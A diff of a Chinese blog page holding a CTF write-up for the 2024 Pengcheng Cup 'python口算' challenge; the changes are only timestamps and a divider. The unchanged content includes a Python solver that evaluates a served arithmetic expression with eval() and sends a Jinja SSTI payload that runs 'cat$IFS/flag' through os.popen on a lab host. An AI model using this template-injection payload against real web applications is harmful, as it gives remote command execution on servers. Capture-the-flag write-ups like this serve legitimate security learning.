@@ -26,7 +26,7 @@
 <meta property="og:description" content="鹏程杯好难，累死累活一天也只写出一道(〒︿〒) 等之后仔细学习一下别人的WP，希望能学到更多有用的知识 python口算-pcb2024又是一道小猿搜题的题（果然哪里的CTFer都是一样对热梗毫无抵抗力） 请求&#x2F;calc路由可以获取到算式信息，直接利用eval()函数就能直接计算了 发送正确的计算结果之后，就可以获取到提示，下载网页源码 分析源码，发现有SSTI注入点，不过不确定黑名单与白名单都包">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-11-09T13:57:11.000Z">
-<meta property="article:modified_time" content="2024-11-09T14:12:38.466Z">
+<meta property="article:modified_time" content="2024-11-09T14:13:46.951Z">
 <meta property="article:author" content="Wang1rrr">
 <meta property="article:tag" content="CTF|WP">
 <meta name="twitter:card" content="summary">
@@ -266,8 +266,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-11-09 22:12:38</span>
-            <span class="mobile">2024-11-09 22:12:38</span>
+            <span class="desktop">2024-11-09 22:13:46</span>
+            <span class="mobile">2024-11-09 22:13:46</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -315,7 +315,7 @@
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://192.168.18.28/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://192.168.18.28/calc&#x27;</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是请求返回的二进制数据</span></span><br><span class="line">data = response.content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将二进制数据转换为字符串</span></span><br><span class="line">expression = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用正则表达式去除可能的空格</span></span><br><span class="line">expression = re.sub(<span class="string">r&#x27;\s+&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expression)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 eval 函数计算表达式的值</span></span><br><span class="line"><span class="comment"># 注意：eval 函数具有安全风险，适用于可信数据源</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">eval</span>(expression)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;__import__&#x27;)(&#x27;os&#x27;).popen(&#x27;cat$IFS/flag&#x27;).read()&#125;&#125;&quot;</span>  <span class="comment"># 你想发送的 username 值</span></span><br><span class="line">    &#125;</span><br><span class="line">    response1 = requests.post(url=<span class="string">f&quot;http://192.168.18.28/?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span>,data=data)</span><br><span class="line">    <span class="comment">#response2=requests.get(url=&quot;http://192.168.18.28/?username=user123&quot;)</span></span><br><span class="line">    <span class="built_in">print</span>(response1.text)</span><br><span class="line">    <span class="comment">#print(response2.text)</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;计算出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
 
 <p>读取到flag</p>
-<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;这里是分割线&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;这里是分割线&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
 <p>其实尝试的好几道题都有思路，但都卡在某些地方无法继续，希望别人的WP能帮我解惑</p>
 <p>(๑•́ ω •̀๑)</p>
 
@@ -332,7 +332,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2024-11-09 22:12:38
+                    :</strong> 2024-11-09 22:13:46
             </li>
         
         <li>
